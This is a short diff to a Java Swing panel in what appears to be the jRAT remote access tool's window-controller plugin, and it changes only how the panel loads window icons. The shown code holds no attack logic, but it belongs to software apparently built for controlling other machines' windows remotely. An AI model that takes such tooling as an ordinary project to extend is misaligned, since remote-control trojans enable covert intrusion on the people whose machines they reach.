@@ -1,7 +1,5 @@
 package jrat.plugin.window.client;
 
-import iconlib.IconUtils;
-
 import java.awt.BorderLayout;
 import java.awt.Color;
 import java.awt.Component;
@@ -19,6 +17,7 @@ import javax.swing.table.DefaultTableCellRenderer;
 import javax.swing.table.DefaultTableModel;
 
 import jrat.api.Client;
+import jrat.api.Icons;
 import jrat.api.net.EmptyPacketBuilder;
 import jrat.api.ui.BaseControlPanel;
 
@@ -104,9 +103,9 @@ public class WindowPanel extends BaseControlPanel implements NewWindowListener {
 				if (window.getIcon() != null) {
 					label.setIcon(window.getIcon());
 				} else if (window.isVisible()) {
-					label.setIcon(IconUtils.getIcon("window", WindowPanel.class));
+					label.setIcon(Icons.getIcon("Window Controller", "/icons/window.png"));
 				} else {
-					label.setIcon(IconUtils.getIcon("window-disabled", WindowPanel.class));
+					label.setIcon(Icons.getIcon("Window Controller", "/icons/window-disabled.png"));
 				}
 				
 				if (window.getTitle().length() == 0) {
